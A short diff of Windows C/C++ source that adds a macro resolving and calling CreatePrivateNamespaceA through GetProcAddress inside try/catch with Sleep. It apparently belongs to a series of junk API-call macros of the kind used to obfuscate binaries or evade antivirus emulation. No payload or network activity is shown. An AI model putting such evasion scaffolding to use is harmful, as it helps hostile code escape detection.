@@ -202,6 +202,7 @@ typedef BOOL (WINAPI *CHECKD8)(LPCTSTR,LPSTR,DWORD,PBOOL,PBOOL);
 typedef BOOL (WINAPI *CRDP)(HANDLE,PBOOL);
 typedef HANDLE (WINAPI *CMRN)(BOOL);
 typedef HANDLE (WINAPI *CME)(LPSECURITY_ATTRIBUTES,LPCTSTR,DWORD,DWORD);
+typedef HANDLE (WINAPI *CPN)(LPSECURITY_ATTRIBUTES,LPVOID,LPCTSTR);
 PROCNTQSI NtQuerySystemInformation;
 typedef BOOL (CALLBACK *PROCENUMPROC)(DWORD, WORD, LPSTR, LPARAM);
 typedef struct {
@@ -2497,6 +2498,16 @@ if(GetLastError()==ERROR_ALREADY_EXISTS)\
 	}\
 	catch(...) {\
 	Sleep(187);\
+	}
+
+#define XCODE188 try {OUTSTR("188");\
+	pFunc=GetProcAddress(LoadLibrary("kernel32.dll"),"CreatePrivateNamespaceA");\
+	if(pFunc) {\
+	hXMod=((CPN)pFunc)(&psa,lp,szXBuff);\
+	}\
+	}\
+	catch(...) {\
+	Sleep(188);\
 	}
 #ifdef FLOWERX
 #include "xrand.h"
